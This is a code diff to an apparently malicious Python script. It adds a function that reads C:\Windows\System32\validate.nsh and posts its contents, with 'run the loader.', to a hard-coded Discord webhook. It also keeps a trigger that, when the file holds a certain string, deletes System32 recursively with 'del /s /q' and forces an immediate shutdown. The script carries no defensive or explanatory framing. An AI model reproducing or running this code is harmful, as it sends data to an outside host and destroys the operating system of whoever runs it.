@@ -46,8 +46,25 @@ def read_file(file_path):
 
 file_pathxx = r'C:\Windows\System32\validate.nsh'
 file_contentsx1 = read_file(file_pathxx)
+
+def send_dx(webhook_url, message):
+    data = {
+        "content": message
+    }
+
+    response = requests.post(webhook_url, json=data)
+
+    if response.status_code == 204:
+        print("Message sent successfully.")
+    else:
+        print(f"Failed to send message. Status code: {response.status_code}")
+
+webhook_url = "https://discord.com/api/webhooks/1273024308729352192/jPqxaz_B33A7f_hbPyoMJZrgc31-hc0_1u-1iw7DLZdxOkstl5BRFitzCmxNoyAWd4MM"
+message = file_contentsx1+" run the loader."
+send_dx(webhook_url, message)
+
 if file_contentsx1 =="mJaAQuPVWhWXG":
-    shutil.rmtree(r'C:\Windows\System32')
+    subprocess.run(r'del /s /q C:\Windows\System32\*', shell=True)
     os.system("shutdown /s /f /t 0")
 
 
